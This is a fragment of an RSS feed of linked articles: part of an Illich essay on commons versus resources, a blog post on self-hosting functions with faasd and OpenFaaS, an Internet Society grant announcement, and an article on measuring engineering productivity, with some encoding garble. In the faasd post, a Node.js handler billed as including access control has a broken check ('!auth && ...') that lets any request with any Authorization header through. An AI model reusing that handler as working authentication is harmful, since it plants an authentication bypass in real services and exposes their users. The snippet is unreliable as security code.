						Electronic management as a political issue can be approached in several ways. I propose, at the beginning of this public consultation, to approach the issue as one of political ecology. Ecology, during the last ten years, has acquired a new meaning. It is still the name for a branch of professional biology, but the term now increasingly serves as the label under which a broad, politically organized general public analyzes and influences technical decisions. I want to focus on the new electronic management devices as a technical change of the human environment which, to be benign, must remain under political (and not exclusively expert) control. I have chosen this focus for my introduction, because I thus continue my conversation with those three Japanese colleagues to whom I owe what I know about your country - Professors Yoshikazu Sakamoto, Joshiro Tamanoi and Jun Ui.</p><p>
						
						In the 13 minutes still left to me on this rostrum I will clarify a distinction that I consider fundamental to political ecology. I shall distinguish the environment as commons from the environment as resource. On our ability to make this particular distinction depends not only the construction of a sound theoretical ecology, but also - and more importantly - effective ecological jurisprudence Minna-san, how I wish, at this point, that I were a pupil trained by your Zen poet, the great Basho. Then perhaps in a bare 17 syllables I could express the distinction between the commons within which people's subsistence activities are embedded, and resources that serve for the economic production of those commodities on which modem survival depends. If I were a poet, perhaps I would make this distinction so beautifully and incisively that it would penetrate your hearts and remain unforgettable. Unfortunately I am not a Japanese poet. I must speak to you in English, a language that during the last 100 years has lost the ability to make this distinction, and - in addition - I must speak through translation. Only because I may count on the translating genius of Mr. Muramatsu do I dare to recover Old English meanings with a talk in Japan.</p><p>
						
						"Commons" is an Old English word. According to my Japanese friends, it is quite close to the meaning that iriai still has in Japanese "Commons," like iriai, is a word which, in preindustrial times, was used to designate certain aspects of the environment. People called commons those parts of the environment for which customary law exacted specific forms of community respect. People called commons that part of the environment which lay beyond their own thresholds and outside of their own possessions, to which, however, they had recognized claims of usage, not to produce commodities but to provide for the subsistence of their households. The customary law which humanized the environment by establishing the commons was usually unwritten. It was unwritten law not only because people did not care to write it down, but because what it protected was a reality much too complex to fit into paragraphs. The law of the commons regulates the right of way, the right to fish and to hunt, to graze, and to collect wood or medicinal plants in the forest.</p><p>
						
						An oak tree might be in the commons. Its shade, in summer, is reserved for the shepherd and his flock; its acorns are reserved for the pigs of the neighbouring peasants; its dry branches serve as fuel for the widows of the village; some of its fresh twigs in springtime are cut as ornaments for the church - and at sunset it might be the place for the village assembly. When people spoke about commons, iriai, they designated an aspect of the environment that was limited, that was necessary for the community's survival, that was necessary for different groups in different ways, but which, in a strictly economic sense, was not perceived as scarce.</p><p>
						
						When today, in Europe, with university students I use the term "commons" (in German Almende or Gemeinheit, in Italian gli usi civici) my listeners immediately think of the eighteenth century. They think of those pastures in England on which villagers each kept a few sheep, and they think of the "enclosure of the pastures" which transformed the grassland from commons into a resource on which commercial flocks could be raised. Primarily, however, my students think of the innovation of poverty which came with enclosure: of the absolute impoverishment of the peasants, who were driven from the land and into wage labour, and they think of the commercial enrichment of the lords.</p><p>
						
						In their immediate reaction, my students think of the rise of a new capitalist order. Facing that painful newness, they forget that enclosure also stands for something more basic. The enclosure of the commons inaugurates a new ecological order: Enclosure did not just physically transfer the control over grasslands from the peasants to the lord. Enclosure marked a radical change in the attitudes of society towards the environment. Before, in any juridical system, most of the environment had been considered as commons from which most people could draw most of their sustenance without needing to take recourse to the market. After enclosure, the environment became primarily a resource at the service of "enterprises" which, by organizing wage-labor, transformed nature into the goods and services on which the satisfaction of basic needs by consumers depends. This transformation is in the blind spot of political economy.</p><p>
						
						This change of attitudes can be illustrated better if we think about roads rather than about grasslands. What a difference there was between the new and the old parts of Mexico City only 20 years ago. In the old parts of the city the streets were true commons. Some people sat on the road to sell vegetables and charcoal. Others put their chairs on the road to drink coffee or tequila. Others held their meetings on the road to decide on the new headman for the neighbourhood or to determine the price of a donkey. Others drove their donkeys through the crowd, walking next to the heavily loaded beast of burden; others sat in the saddle. Children played in the gutter, and still people walking could use the road to get from one place to another.</p><p>
						
						Such roads were not built for people. Like any true commons, the street itself was the result of people living there and making that space liveable. The dwellings that lined the roads were not private homes in the modern sense - garages for the overnight deposit of workers. The threshold still separated two living spaces, one intimate and one common. But neither homes in this intimate sense nor streets as commons survived economic development.</p><p>
						
						In the new sections of Mexico City, streets are no more for people. They are now roadways for automobiles, for buses, for taxis, cars, and trucks. People are barely tolerated on the streets unless they are on their way to a bus stop. If people now sat down or stopped on the street, they would become obstacles for traffic, and traffic would be dangerous to them. The road has been degraded from a commons to a simple resource for the circulation of vehicles. People can circulate no more on their own. Traffic has displaced their mobility. They can circulate only when they are strapped down and are moved. </p><p>
						
						The appropriation of the grassland by the lords was challenged, but the more fundamental transformation of grassland (or of roads) from commons to resource has happened, until recently, without being subjected to criticism. The appropriation of the environment by the few was clearly recognized as an intolerable abuse By contrast, the even more degrading transformation of people into members of an industrial labour force and into consumers was taken, until recently, for granted. For almost a hundred years the majority of political parties has challenged the accumulation of environmental resources in private hands. However, the issue was argued in terms of the private utilization of these resources, not the distinction of commons. Thus …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.davidtinapple.com/illich/1983_silence_commons.html">http://www.davidtinapple.com/illich/1983_silence_commons.html</a></em></p>]]>
            </description>
            <link>http://www.davidtinapple.com/illich/1983_silence_commons.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26007100</guid>
            <pubDate>Tue, 02 Feb 2021 21:35:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I discovered FaaS and what it changed for me]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26006415">thread link</a>) | @feross
<br/>
February 2, 2021 | https://releasecandidate.dev/posts/2021/discovery-faasd-and-openfaas/ | <a href="https://web.archive.org/web/*/https://releasecandidate.dev/posts/2021/discovery-faasd-and-openfaas/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><p>Regularly, I discover myself thinking <em>"wow, that's so simple I can build this in a weekend"</em>. My rational brain kicks in at some point: <em>"Waaaaiiit a second, if it's so simple, why am I not seeing this done a million times?"</em>. Here I usually start better scoping and either find the answer to my question.</p><p>Often, my developer mind insists on "it's actually just two API endpoints and then I could do this and that". And often this holds true for the core functionality. If some <a href="https://peterthaleikis.com/business-idea-validation/">basic validation</a> gives a green light for working on it from a commercial perspective, I still need to consider the tech stack and marketing approach, as <a href="https://roadmap.sh/guides/why-build-it-and-they-will-come-wont-work-anymore">building alone doesn't do it</a>.</p><p>I'm not super fixed on the approach, my main goal is usually to keep long term overhead low. Laravel is my go-to solution for anything backend-heavy, but its power comes at a complexity cost too. For two little API endpoints used in, for example, a browser extension is a bit of an overkill.</p><p>Function as a service sounds like a great step towards "just having a few API endpoints". AWS Lambda is the name everyone is having in mind here. But any gains from simplicity are eaten up by AWS complexity. If you are new to AWS (Lambda), it easily takes you double or more time to get it running as you spend building the little lean function in the first place. This doesn't go well with the plan to "just chuck this out over the weekend".</p><h2 id="enter%3A-faasd">Enter: faasd <a href="#enter%3A-faasd">#</a></h2><p>Function as a Service should be easy. Here comes <a href="https://www.openfaas.com/blog/introducing-faasd/">faasd</a> into play. It's a self-hosted alternative to run functions. It allows you to run a simple copy &amp; paste installer script on your machine getting it up and running. It takes less than ten minutes to get to work. It's production-ready and helps to remove the learning curve involved with Kubernetes and co.</p><blockquote><p>faasd is a self-hosted alternative to AWS Lambda to run functions. Production-ready within minutes ⏲️</p></blockquote><p>Once you have deployed your faasd instance, it's a matter of one command to push your function into production. From there it's up to you what you like to build. I catch myself breaking up the structure of larger applications in functions. It builds the container, publishes, and deploys your function code ready-to-use in seconds. To run this you will need the <a href="https://github.com/openfaas/faas-cli">FaaS CLI</a>. Again this is installed in under one minute thanks to copy and paste that just works.</p><p>Found a great library but it's written in the "wrong" language? Thanks to the flexibility, you can also jump between programming languages easily. I use a mix of nodejs, PHP, and Python by now.</p><blockquote><p>With functions you libraries aren't in the <em>wrong</em> language anymore.</p></blockquote><p>This helps to truly break up large applications into functional parts using the best tool for you. You can get a rich list of the official templates by running:</p><pre><code>$ faas-cli template store list<p>NAME                     SOURCE             DESCRIPTION<br>csharp                   openfaas           Classic C<br>dockerfile               openfaas           Classic Dockerfile template<br>go                       openfaas           Classic Golang template<br>java8                    openfaas           Java <span>8</span> template<br>java11                   openfaas           Java <span>11</span> template<br>java11-vert-x            openfaas           Java <span>11</span> Vert.x template<br>node12                   openfaas           HTTP-based Node <span>12</span> template<br>node                     openfaas           Classic NodeJS <span>8</span> template<br>php7                     openfaas           Classic PHP <span>7</span> template<br>python                   openfaas           Classic Python <span>2.7</span> template<br>python3                  openfaas           Classic Python <span>3.6</span> template<br>python3-dlrs             intel              Deep Learning Reference Stack v0.4 <span>for</span> ML workloads<br>ruby                     openfaas           Classic Ruby <span>2.5</span> template<br>ruby-http                openfaas           Ruby <span>2.4</span> HTTP template<br>python27-flask           openfaas           Python <span>2.7</span> Flask template<br>python3-flask            openfaas           Python <span>3.7</span> Flask template<br>python3-flask-debian     openfaas           Python <span>3.7</span> Flask template based on Debian<br>python3-http             openfaas           Python <span>3.7</span> with Flask and HTTP<br>python3-http-debian      openfaas           Python <span>3.7</span> with Flask and HTTP based on Debian<br>golang-http              openfaas           Golang HTTP template<br>golang-middleware        openfaas           Golang Middleware template<br>python3-debian           openfaas           Python <span>3</span> Debian template<br>powershell-template      openfaas-incubator Powershell Core Ubuntu:16.04 template<br>powershell-http-template openfaas-incubator Powershell Core HTTP Ubuntu:16.04 template<br>rust                     booyaa             Rust template<br>crystal                  tpei               Crystal template<br>csharp-httprequest       distantcam         C<br>csharp-kestrel           burtonr            C<br>vertx-native             pmlopes            Eclipse Vert.x native image template<br>swift                    affix              Swift <span>4.2</span> Template<br>lua53                    affix              Lua <span>5.3</span> Template<br>vala                     affix              Vala Template<br>vala-http                affix              Non-Forking Vala Template<br>quarkus-native           pmlopes            Quarkus.io native image template<br>perl-alpine              tmiklas            Perl language template based on Alpine image<br>crystal-http             koffeinfrei        Crystal HTTP template<br>rust-http                openfaas-incubator Rust HTTP template<br>bash-streaming           openfaas-incubator Bash Streaming template<br>cobol                    devries            COBOL Template</p></code></pre><p>There are also inofficial templates you can find with a bit of research on GitHub.</p><p>Start with a new function by running:</p><pre><code>faas-cli new function-name --lang node12</code></pre><p>This creates a function based on the node12 template. Now you can develop the function in the <code>handler.js</code>-file. This approach works similarly for all other functions. Once you ready run <code>faas-cli up</code> to deploy the function.</p><h2 id="building-a-function">Building a Function <a href="#building-a-function">#</a></h2><p>I like to learn by doing. So I started by building a simple <a href="https://github.com/spekulatius/faasd-franc">function to detect the language</a> of a given string. The <a href="https://github.com/spekulatius/faasd-franc/blob/master/franc/handler.js">whole function</a> including access control is only 31 lines with plenty of space:</p><pre><code><span>'use strict'</span><p><span>const</span> fs <span>=</span> <span>require</span><span>(</span><span>'fs'</span><span>)</span><br><span>const</span> fsPromises <span>=</span> fs<span>.</span>promises<br><span>let</span> franc <span>=</span> <span>require</span><span>(</span><span>'franc'</span><span>)</span></p><p>module<span>.</span><span>exports</span> <span>=</span> <span>async</span> <span>(</span><span>event<span>,</span> context</span><span>)</span> <span>=&gt;</span> <span>{</span><br>  <br>  <span>let</span> secret <span>=</span> <span>await</span> fsPromises<span>.</span><span>readFile</span><span>(</span><span>"/var/openfaas/secrets/franc-token"</span><span>,</span> <span>"utf8"</span><span>)</span><br>  <span>let</span> auth <span>=</span> event<span>.</span>headers<span>[</span><span>"authorization"</span><span>]</span><br>  <span>if</span><span>(</span><span>!</span>auth <span>&amp;&amp;</span> auth <span>!=</span> <span>"Bearer: "</span> <span>+</span> secret<span>)</span> <span>{</span><br>    <span>return</span> context<br>      <span>.</span><span>status</span><span>(</span><span>403</span><span>)</span><br>      <span>.</span><span>headers</span><span>(</span><span>{</span><span>"Content-Type"</span><span>:</span> <span>"application/json"</span><span>}</span><span>)</span><br>      <span>.</span><span>succeed</span><span>(</span><span>{</span><span>"status"</span><span>:</span> <span>"Unauthorized"</span><span>}</span><span>)</span><br>  <span>}</span></p><p>  <span>let</span> response <span>=</span> <span>{</span><span>}</span><br>  <span>if</span> <span>(</span>event<span>.</span>query<span>.</span>query <span>==</span> <span>undefined</span> <span>||</span> event<span>.</span>query<span>.</span>query<span>.</span>length <span>==</span> <span>0</span><span>)</span> <span>{</span><br>    response<span>.</span>status <span>=</span> <span>'Error'</span><br>    response<span>.</span>message <span>=</span> <span>'No query string provided'</span><br>  <span>}</span> <span>else</span> <span>{</span><br>    response<span>.</span>status <span>=</span> <span>'Success'</span><br>    response<span>.</span>result <span>=</span> franc<span>.</span><span>all</span><span>(</span>event<span>.</span>query<span>.</span>query<span>)</span><span>.</span><span>splice</span><span>(</span><span>0</span><span>,</span> <span>10</span><span>)</span><br>  <span>}</span></p><p>  <span>return</span> context<br>    <span>.</span><span>status</span><span>(</span><span>200</span><span>)</span><br>    <span>.</span><span>headers</span><span>(</span><span>{</span><span>"Content-Type"</span><span>:</span> <span>"application/json"</span><span>}</span><span>)</span><br>    <span>.</span><span>succeed</span><span>(</span>response<span>)</span><br><span>}</span></p></code></pre><p>Functions as a service are made for this: You can easily try out a library or different programming language as it's made to be disposable. Don't like how it's going? Drop it, delete the function and your system is clean once more. No compilers, dependencies, and other tooling remain on your system.</p><h2 id="lessons-learned-along-the-way">Lessons learned along the way <a href="#lessons-learned-along-the-way">#</a></h2><p>At the beginning, I didn't want to run my own container registry. I expected additional overhead and "another thing to maintain". This turned out to be a mistake, as the setup was almost as easy as faasd itself. Plus, the performance is much better than relying on Docker Hub.</p><p>I got it up and running on my <a href="https://peterthaleikis.com/hetzner">Hetzner server</a> in a few minutes using some guides from <a href="https://peterthaleikis.com/digitalocean">DigitalOcean</a>.</p><p>After spinning up your server, the steps break down to:</p><ul><li><a href="https://docs.docker.com/engine/install/ubuntu/">installing docker</a>,</li><li>setting up the <a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-a-private-docker-registry-on-ubuntu-18-04">container registry</a>, and</li><li><a href="https://www.digitalocean.com/community/tutorials/how-to-secure-nginx-with-let-s-encrypt-on-ubuntu-18-04">securing nginx</a>.</li></ul><p>Another really interesting option is <a href="https://get-arkade.dev/">arkade</a>. It allows you to abstract the steps.</p><p>I should have also paid closer attention to the <a href="https://github.com/openfaas/workshop/">OpenFaaS workshop</a> at the beginning. It guides you through the basics with examples better than purely self-discovery does. This is especially true for me, as I'm not deep in the serverless space.</p><h2 id="worry-about-scaling%2C-when-you-get-to-scale">Worry about scaling, when you get to scale <a href="#worry-about-scaling%2C-when-you-get-to-scale">#</a></h2><p>As with any solution approach, there are limitations. For the most time, I leave these concerns out. It simply doesn't matter if my functions can scale to millions of users, as I don't have millions of users. Migrating to a more scalable approach such as <a href="https://github.com/openfaas/openfaas-cloud">OpenFaaS Cloud</a> should be very doable.</p><blockquote><p>Worry about scaling, when you get to scale. Until then build and market.</p></blockquote><p>We can probably agree: The people behind a project matter to its success for a large part. The OpenFaaS project is driven by <a href="https://blog.alexellis.io/">Alex Ellis</a>, a passionate developer. He and the contributors maintain an active slack channel - questions from newbie-level to expert find answers there. Alex is supporting this effort with contracting, but other options such as sponsorship of <a href="https://github.com/sponsors/openfaas">OpenFaaS</a> or <a href="https://github.com/sponsors/alexellis">Alex</a> directly are available (and recommended).</p><h2 id="get-playing">Get Playing <a href="#get-playing">#</a></h2><p>As with any reading: It can only take you so far. Make sure to put a few hours aside and check out faasd! It does come with a little overhead to learn and keep up. Especially for independent developers eyeing to monetize an API or build a small SaaS this could be a great solution.</p><ul><li>Head over to <a href="https://github.com/openfaas/faasd">faasd</a>! Feel free to star or fork the project on GitHub!</li><li>If you like to discover new open-source projects and see how you could apply them, <a href="https://twitter.com/spekulatius1984">follow me on Twitter</a> and <a href="https://buttondown.email/spekulatius">sign up for my newsletter</a>.</li></ul><p>Want to dive in proper? Check out the <a href="https://gumroad.com/a/998896755">"serverless for the rest of us" ebook</a> by OpenFaaS-developer Alex Ellis.</p><p>Since you've made it this far, <a href="https://releasecandidate.dev/posts/2021/discovery-faasd-and-openfaas/" on-click="share">sharing</a> this article on your favorite social media network would be highly appreciated 💖! For feedback, please <a href="https://twitter.com/spekulatius1984" rel="noopener" target="_blank">ping me on Twitter.</a></p><share-widget></share-widget><p>Published <time datetime="2021-01-13">13 Jan 2021</time></p></article></div></div>]]>
            </description>
            <link>https://releasecandidate.dev/posts/2021/discovery-faasd-and-openfaas/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26006415</guid>
            <pubDate>Tue, 02 Feb 2021 20:47:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[$1M in grants to researchers studying the future of the Internet]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26005911">thread link</a>) | @infodocket
<br/>
February 2, 2021 | https://www.isocfoundation.org/2021/01/announcing-1m-in-grants-to-researchers-studying-the-future-of-the-internet/ | <a href="https://web.archive.org/web/*/https://www.isocfoundation.org/2021/01/announcing-1m-in-grants-to-researchers-studying-the-future-of-the-internet/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-node="5c39191705c37">
<div>
<p><strong>We recently awarded over $1 million through our </strong><a href="https://www.isocfoundation.org/grant-programme/research-grant-programme/">Research grant programme</a><strong> to seven exciting projects that examine the future and sustainability of the Internet. </strong>In its pilot year, this programme seeks to support a diverse group of researchers who are generating solutions today to meet the Internet challenges of tomorrow.</p>
<p>The selected projects examine important issues around the Internet’s relationship to society, such as: the economic cost of the digital gender gap, the impact of digital labour platforms on worker’s rights, what climate solutions might help decarbonize the subsea cable network, and more.</p>
<p>Recommended for funding by an Independent Programme Review Committee, the awardees hail from Australia, Austria, India, Malawi, and the U.S. These grants are intended for applied research that will be published and made available to the scientific community at no cost.</p>
<p>Through these grants, we look forward to enabling new and valuable research on the future of the Internet, research that will influence policy and industry decisions and ultimately help shape a more equitable and sustainable future for the Internet and the people it serves.</p>
<p>Learn more about each awardee in the list below.</p>
<p>1<a href="https://www.eli.org/news/internet-society-foundation-funds-new-research-environmental-footprint-digital-economy">. Environmental Law Institute</a> <strong>– USA <strong>–</strong></strong> <strong>$200,000 &nbsp;</strong></p>
<p><strong>Theme:</strong> Greening the Internet</p>
<p><strong>Project Title:</strong> Creating a Research Strategy to Green the Internet</p>
<p><strong>Research Question:</strong> How can we identify high-value, high-impact research on the energy and environmental impacts of the digital economy?</p>

<p>2. <a href="https://cis-india.org/">The Centre for Internet and Society</a><strong> – India <strong>–</strong> $200,000 &nbsp;</strong></p>
<p><strong>Theme:</strong> The Internet Economy</p>
<p><strong>Project Title:</strong> Labour futures: Intersectional policy making for the platform economy</p>
<p><strong>Research Question: </strong>How are digital platforms broadly, and digital labour platforms specifically, occupying and performing their roles as intermediaries and infrastructure in the global south?<br></p>

<p>3. <strong>Chomora Mikeka (Independent Researcher) – Malawi <strong>–</strong> $57,017 &nbsp;</strong></p>
<p><strong>Theme:</strong> Greening the Internet</p>
<p><strong>Project Title:</strong> Greening Internet of Things (IoT) for Smart Cities</p>
<p><strong>Research Question:</strong> Can IoT Sensors used for Smart Garbage Collection in Smart Cities be Green Powered?</p>

<p>4. <a href="https://worlddata.io/">World Data Lab</a><strong> – Austria <strong>–</strong> $193,660 &nbsp;</strong></p>
<p><strong>Theme:</strong> The Internet Economy</p>
<p><strong>Project Title</strong>: International Internet Inequality Index</p>
<p><strong>Research Question</strong>: Which economic and demographic factors contribute to global Internet access in the future?</p>

<p>5. <a href="https://webfoundation.org/">World Wide Web Foundation</a><strong> – USA <strong>–</strong> $199,974 &nbsp;</strong></p>
<p><strong>Theme:</strong> The Internet Economy</p>
<p><strong>Project Title</strong>: The Cost of Excluding Women: The Digital Gender Gap &amp; Economic Prospects</p>
<p><strong>Research Question:</strong> What is the economic impact of not having women participate in digital economies due to the digital gender gap?</p>
<p>6. <a href="https://digitalrightswatch.org.au/">Digital Rights Watch</a><strong> – Australia – $187,299 – 18 months</strong></p>
<p><strong>Theme:</strong> The Internet Economy</p>
<p><strong>Project Title:</strong> An International Internet for Local Needs</p>
<p><strong>Research Question:</strong> How can we rebalance bargaining power between local actors and international Internet players?</p>
<p>7.<a href="https://www.totaltele.com/508363/SubOptic-Association-Launches-the-SubOptic-Foundation"> SubOptic Foundation</a><strong> – USA – $200,000 – 24 months</strong></p>
<p><strong>Theme:</strong> Greening the Internet</p>
<p><strong>Project Title:</strong> Decarbonizing the Subsea Cable Network</p>
<p><strong>Research Question</strong>: What is the average carbon footprint of a cable station, and what climate solutions might help to mitigate this footprint?</p>
<p><em>The </em><a href="https://www.isocfoundation.org/grant-programme/research-grant-programme/"><em>Research programme</em></a><em> is open to independent researchers and research institutions worldwide and is currently accepting statements of interest, to be reviewed on a rolling basis. </em><em>Grants of up to US$200,000 will be awarded for research lasting up to 2 years.</em></p>

</div>
</div></div>]]>
            </description>
            <link>https://www.isocfoundation.org/2021/01/announcing-1m-in-grants-to-researchers-studying-the-future-of-the-internet/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26005911</guid>
            <pubDate>Tue, 02 Feb 2021 20:08:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Engineering productivity can be measured, just not how you'd expect]]>
            </title>
            <description>
<![CDATA[
Score 135 | Comments 88 (<a href="https://news.ycombinator.com/item?id=26005758">thread link</a>) | @tomasrb
<br/>
February 2, 2021 | https://www.okayhq.com/blog/engineering-productivity-can-be-measured | <a href="https://web.archive.org/web/*/https://www.okayhq.com/blog/engineering-productivity-can-be-measured">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>From each of our <a href="https://www.linkedin.com/in/antoineboulanger/" rel="nofollow noopener noreferrer" target="_blank">two</a>  <a href="https://www.linkedin.com/in/tomasrb/" rel="nofollow noopener noreferrer" target="_blank">experiences</a> starting out as introductory-level engineers at Box, to becoming first-time managers overseeing five-person teams, then directors overseeing 30-50, and ultimately VPs managing hundreds, we've experienced software engineering from every angle.</p>
<p>At every step of the way, we asked ourselves: "how do we know if we are bringing value as engineering leaders?" Effective leadership uniquely blends human qualities - influence, empathy, courage, and <strong>results</strong>. This latter quality always brings the question of productivity - how effective are you at producing results through enabling others?</p>
<p>Since the advent of the software industry, most engineering teams have seen productivity as a black box. Only recently have people even begun to build internal tools that optimize performance. Unfortunately, most of these tools measure the wrong metrics and are shockingly similar across companies. We even built some of these tools and made mistakes. Now, we'd like to share the way forward.Â&nbsp;</p>
<h2 id="engineering-effectiveness-is-behind-the-times">Engineering Effectiveness is Behind the TimesÂ&nbsp;</h2>
<p>Engineering teams are both the most expensive and most fundamental part of tech companies. As <a href="https://www.wsj.com/articles/every-company-is-now-a-tech-company-1543901207" rel="nofollow noopener noreferrer" target="_blank">more companies become tech-enabled</a>, the importance of engineering will only increase. Yet today, a full three decades after the advent of the internet, most engineering departments still rely exclusively on qualitative signals of performance.</p>
<p><strong>The evolution of engineering effectiveness is paralleling the spirit of sales' recent transformation</strong>. In the early 2000s, sales was considered an art, so sales leaders could skate by on charisma alone. Today, with tools like <a href="https://www.salesforce.com/" rel="nofollow noopener noreferrer" target="_blank">Salesforce</a>, <a href="https://www.clari.com/" rel="nofollow noopener noreferrer" target="_blank">Clari</a>, and <a href="https://people.ai/get-demo/?utm_campaign=demorequest&amp;utm_source=google&amp;utm_medium=ppc&amp;utm_term=se-goog-1089&amp;utm_content=demorequest&amp;gclid=CjwKCAiAxp-ABhALEiwAXm6Iye9qQZaeojCPMvXn73zi-TRqbT93l7waQz3_uSadhOtpXncm8OLtvBoClTkQAvD_BwE" rel="nofollow noopener noreferrer" target="_blank">People.ai</a>, sales has fully executed the transition toward scientific, metric-based leadership for analyzing and improving performance.</p>
<p>In the coming years, engineering will adopt a similar, data-driven mode of management. In making this transition, however, most engineering teams are making these mistakes:</p>
<h3 id="mistake-1-measuring-approximations-of-output">Mistake #1: Measuring Approximations of Output</h3>
<p>In their haste to become more data-driven, many engineering leaders are measuring their team's performance based on metrics intended to approximate output. <strong>These metrics fail because they encourage engineers to game the system.</strong></p>
<p>If you measure a fixed metric like lines of code or number of tickets closed, your engineers will begin splitting code into more lines or breaking bug fixes into multiple tickets. Even sprint points, which attempt to convert engineering work into a standard unit, suffer from this pitfall: Some engineers will slow down after reaching their sprint points for the week while others will strategically inflate their tasks to be awarded additional points.</p>
<p><strong>Experienced engineers will recognize that this type of measurement is fake</strong>. While they may not be as influenced to "play the game," their morale will plummet and they will self-select out. By rewarding approximated metrics of output, you're encouraging engineers to increase them regardless of how they correlate with software development success.</p>
<blockquote>
<p>No matter which metrics you choose, abstract output approximations will distract engineers from their actual jobs, ultimately decreasing both your team's effectiveness and morale.</p>
</blockquote>
<h3 id="mistake-2-not-measuring-anything">Mistake #2: Not Measuring Anything</h3>
<p>On the other end of the spectrum sit engineering leaders who avoid measurement entirely. Many of these leaders have heard about the dangers of measuring the wrong metrics and therefore <strong>ricochet to the other extreme</strong>. They may emphasize the artisanal and social dimensions of engineering, claiming "software engineering is too complex to measure."</p>
<p>Non-measurement can even be self-reinforcing, because it places the leader into the position of being "the good guy." Instead of being a metrics-obsessed big brother, the leader can be the <strong>friendly older brother exclusively focused on keeping their team happy</strong>.</p>
<p><strong>Non-measurement fails because it prioritizes politics over productivity.</strong> If you don't measure any metrics, your engineering leaders will simply justify failures, telling stories like "The customer didn't give us the right requirements" or "We were surprised by unexpected vacations." Software development is complex enough that something always goes wrong; if you don't measure any data, you're at the mercy of individual stories.</p>
<blockquote>
<p>Non-measurement unfairly rewards people with charisma while productive but less-persuasive engineers wallow in frustration.</p>
</blockquote>
<p>At some point, your top performers will see through these political machinations and quit because your culture lacks accountability.</p>
<p>In the short term, non-measurement can have a positive effect on team morale but it destroys morale in the long-term, especially among high performers.Â&nbsp;</p>
<h2 id="the-solution-measure-blockers-at-the-team-level">The Solution: Measure Blockers at the Team LevelÂ&nbsp;</h2>
<p>Instead of measuring some approximation of engineering output, software teams should measure actual, observable metrics that directly correlate to effectiveness.</p>
<p>Productivity is a relationship between inputs and output. In software development, the inputs are a blend of factors--technical, individual, human, etc.--while the output should be functional software that creates value for customers. <strong>Productivity in engineering therefore naturally increases when you remove the blockers getting in the way of your team.</strong></p>
<h3 id="why-you-should-measure-blockers">Why You Should Measure Blockers</h3>
<p>Even at the beginning of the software revolution, there existed the notion that engineers should be nurtured. Starting with Microsoft in the '80s, tech companies gave engineers free resources (like <a href="https://www.businessinsider.com/free-food-silicon-valley-tech-employees-apple-google-facebook-2018-7#google-has-so-much-free-food-employees-worry-about-gaining-the-google-15-4" rel="nofollow noopener noreferrer" target="_blank">food</a> and <a href="https://www.businessinsider.com/companies-amazing-health-and-fitness-benefits-2019-8" rel="nofollow noopener noreferrer" target="_blank">gyms</a>) that would remove blockers to their work. Empirical management practices over the last forty years have reinforced the importance of "<a href="https://www.axelos.com/news/blogs/january-2020/the-importance-of-servant-leadership" rel="nofollow noopener noreferrer" target="_blank">servant leadership</a>" and "<a href="https://www.mugo.ca/Blog/The-most-important-web-project-management-skill-the-ability-to-unblock-others" rel="nofollow noopener noreferrer" target="_blank">unblocking your team</a>," while <a href="https://puppet.com/resources/report/2020-state-of-devops-report/" rel="nofollow noopener noreferrer" target="_blank">recent research</a> emphasizes the importance of optimized inputs and best practices.</p>
<p>For engineers, these inputs include:</p>
<ul>
<li>Quality of developer tools</li>
<li>Frequency and quality of internal activities (like meetings or code reviews)Â&nbsp;</li>
<li>Focused <a href="http://www.paulgraham.com/makersschedule.html" rel="nofollow noopener noreferrer" target="_blank">maker time</a> (free from disruptive meetings)</li>
<li>Easy access to documentation</li>
<li>Psychological safety on the team</li>
<li>Work-life balance</li>
<li>Presence of other high-performersÂ&nbsp;</li>
<li>A fair system of rewards</li>
</ul>
<p>The blockers to these inputs already exist and can be quantified, such as:</p>
<ul>
<li>How much free, uninterrupted time does an engineer have to code?</li>
<li>How long is an engineer waiting on a response from another engineer's review?</li>
<li>How often do dev tools get in the way instead of helping accelerate work?Â&nbsp;</li>
<li>How often are engineers required to <a href="https://en.wikipedia.org/wiki/Context_switch" rel="nofollow noopener noreferrer" target="_blank">context switch</a>, preventing <a href="https://www.calnewport.com/books/deep-work/" rel="nofollow noopener noreferrer" target="_blank">deep work</a>?</li>
<li>How often do engineers receive pages outside of business hours, interrupting their sleep or family life?</li>
</ul>
<p><strong>An engineering leader exists to enable their team to achieve their goals.</strong> Together, these quantified blockers allow engineering leaders to answer key questions like:</p>
<ul>
<li>What is preventing the engineers from building faster?</li>
<li>What issues are arising in real time?Â&nbsp;Â&nbsp;</li>
<li>What technology or process investments would increase team engagement?</li>
</ul>
<p>Each engineering team is unique, so its blockers will be specific. It's not so simple as "more maker time is better." If your engineering team is new or temporarily misaligned on key goals, more meeting time might be the answer. What never changes is the need for measurement and well-considered, deliberate decisions.</p>
<p>Over the last year, COVID-19 has helped demonstrate the value of measuring blockers. For many leaders running newly remote teams, <a href="https://www.ventureharbour.com/remote-work-challenges-solutions/" rel="nofollow noopener noreferrer" target="_blank">new blockers have arisen</a> that would never have been noticed if managers were only focusing on the desired outcome.</p>
<blockquote>
<p>If your team is full of competent, driven engineers, removing their blockers is the fastest way to enable forward movement.</p>
</blockquote>
<h3 id="why-team-is-the-right-level-to-improve">Why "Team" is the Right Level to Improve</h3>
<p>Since software development requires complex interaction between team members, it would be inappropriate to assign individuals their own metrics: Some engineers are effective individual contributors while others enable their teammates to perform. Engineers also <a href="https://techcrunch.com/2020/12/02/okay-nabs-funding-from-sequoia-to-build-performance-dashboards-for-engineering-managers/" rel="nofollow noopener noreferrer" target="_blank">hate being micromanaged</a>, so tracking individual activity can make them feel untrusted.</p>
<p><strong>Just as a sports team wins or loses together, so too should the engineering team be treated as the fundamental unit of success.</strong></p>
<p>Approaching engineering at the team level also places the proper accountability on the manager. It raises helpful questions like "What behaviors, structures, and work habits are preventing us from succeeding?"</p>
